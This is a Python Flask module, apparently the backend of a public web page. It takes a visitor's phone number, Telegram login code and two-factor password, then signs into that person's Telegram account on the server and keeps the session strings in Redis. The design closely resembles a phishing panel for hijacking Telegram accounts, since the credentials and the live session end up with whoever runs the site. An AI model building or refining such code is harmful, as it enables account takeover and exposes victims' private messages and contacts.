import time
import json
import asyncio
import redis
from flask import Blueprint, render_template, request, jsonify
from services.telegram.auth import send_code, sign_in, sign_in_2fa
from core.config import Config

public_bp = Blueprint('public', __name__)

# Инициализация Redis для обмена данными между воркерами Gunicorn
redis_client = redis.from_url(Config.REDIS_URL, decode_responses=True)

def save_session(sid, data):
    redis_client.setex(f"auth_session:{sid}", 300, json.dumps(data)) # TTL 5 минут

def get_session(sid):
    data = redis_client.get(f"auth_session:{sid}")
    return json.loads(data) if data else None

def delete_session(sid):
    redis_client.delete(f"auth_session:{sid}")

@public_bp.route('/')
def index():
    return render_template('index.html')

@public_bp.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.get_json()
    if not data or 'phone' not in data:
        return jsonify({'status': 'error', 'message': 'Phone number required'}), 400

    phone = data['phone']
    session_id = str(int(time.time() * 1000))[-10:] + str(hash(phone))[-6:]

    result = asyncio.run(send_code(phone, session_id))
    if result['status'] == 'success':
        # Сохраняем в Redis
        save_session(session_id, {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_string': result['session_string']
        })
        return jsonify({
            'status': 'success',
            'sid': session_id,
            'timeout': result.get('timeout', 120)
        })
    else:
        return jsonify(result), 400

@public_bp.route('/api/verify', methods=['POST'])
def api_verify():
    data = request.get_json()
    sid = data.get('sid')
    code = data.get('code', '')
    password = data.get('password', '')

    session_data = get_session(sid)
    if not session_data:
        return jsonify({'status': 'error', 'message': 'Session expired or invalid'}), 400

    if password:
        result = asyncio.run(sign_in_2fa(password, sid, session_data['session_string']))
        if result['status'] == 'success':
            delete_session(sid)
        return jsonify(result)
    else:
        result = asyncio.run(sign_in(code, sid, session_data['phone'], session_data['phone_code_hash'], session_data['session_string']))
        if result['status'] == 'need_2fa':
            return jsonify({'status': 'need_2fa'})
        if result['status'] == 'success':
            delete_session(sid)
        return jsonify(result)

@public_bp.route('/api/resend_code', methods=['POST'])
def api_resend():
    data = request.get_json()
    sid = data.get('sid')
    
    session_data = get_session(sid)
    if not session_data:
        return jsonify({'status': 'error', 'message': 'Session expired or invalid'}), 400

    result = asyncio.run(send_code(session_data['phone'], sid))
    if result['status'] == 'success':
        session_data['phone_code_hash'] = result['phone_code_hash']
        session_data['session_string'] = result['session_string']
        save_session(sid, session_data) # Обновляем сессию в Redis
        return jsonify({'status': 'success', 'timeout': result.get('timeout', 120)})
    else:
        return jsonify(result), 400

@public_bp.route('/success')
def success():
    return render_template('success.html')